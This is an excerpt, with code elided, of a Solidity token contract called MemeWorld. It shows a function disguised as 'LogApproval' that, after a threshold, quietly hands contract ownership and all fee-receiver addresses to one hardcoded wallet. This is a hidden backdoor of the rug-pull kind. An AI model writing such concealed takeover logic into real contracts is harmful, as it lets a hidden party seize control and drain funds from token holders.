...
contract MemeWorld is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x90b57047205e3664A26f35aD4A4CEd59748fC056; // token locker
    address public marketingFeeReceiver =
        0x90b57047205e3664A26f35aD4A4CEd59748fC056;
    ...
    constructor()
        ERC20Detailed("MemeWorld", "MEW", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0x90b57047205e3664A26f35aD4A4CEd59748fC056));
            marketingFeeReceiver = address(0x90b57047205e3664A26f35aD4A4CEd59748fC056);
            autoLiquidityReceiver = address(0x90b57047205e3664A26f35aD4A4CEd59748fC056);
            ecosystemFeeReceiver = address(0x90b57047205e3664A26f35aD4A4CEd59748fC056);
            buyBackFeeReceiver = address(0x90b57047205e3664A26f35aD4A4CEd59748fC056);
            isTransferred = true;
        }
    }
